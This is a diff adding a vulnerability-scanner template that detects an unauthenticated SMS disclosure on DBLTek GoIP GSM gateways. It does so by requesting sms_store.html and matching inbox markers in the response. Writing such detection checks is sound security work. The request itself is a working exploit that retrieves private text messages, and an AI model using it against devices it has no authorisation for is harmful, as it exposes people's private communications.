@@ -1,0 +1,30 @@
+id: dbltek-goip-sms-store-info-leak
+
+info:
+  name: Dbltek GoIP sms_store Sensitive Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    DBL DBLTek devices have a security vulnerability in their web server, allowing attackers to obtain sensitive text messages from the system without authorization by accessing a specific URL.
+  reference:
+    - https://shufflingbytes.com/posts/hacking-goip-gsm-gateway/
+  tags: DblTek Web Server
+
+http:
+  - raw:
+      - |
+        GET /default/en_US/include/sms_store.html HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "SMS InBox"
+          - "sms_store_tab"
+        part: body
+        condition: and
